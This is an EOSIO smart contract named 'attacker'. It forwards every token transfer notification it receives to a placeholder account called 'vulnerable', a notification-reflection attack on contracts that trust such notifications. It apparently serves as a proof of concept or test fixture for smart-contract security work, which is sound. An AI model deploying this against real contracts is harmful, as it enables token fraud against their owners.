#include <eosio/asset.hpp>
#include <eosio/eosio.hpp>
#include <eosio/system.hpp>

using namespace eosio;
using namespace std;

static constexpr extended_symbol EOS_SYMBOL =
    extended_symbol(symbol("EOS", 4), name("eosio.token"));

class [[eosio::contract("attacker")]] attacker : public contract {
public:
  using contract::contract;
  attacker(eosio::name receiver, eosio::name code,
           eosio::datastream<const char *> ds)
      : contract(receiver, code, ds) {}

  [[eosio::on_notify("*::transfer")]] void on_transfer(
      name from, name to, eosio::asset quantity, std::string memo) {
    // reflect notification to uninvolved victim account
    require_recipient(name("vulnerable"));
  }

  // such that an ABI is created
  ACTION dummy() {}
};
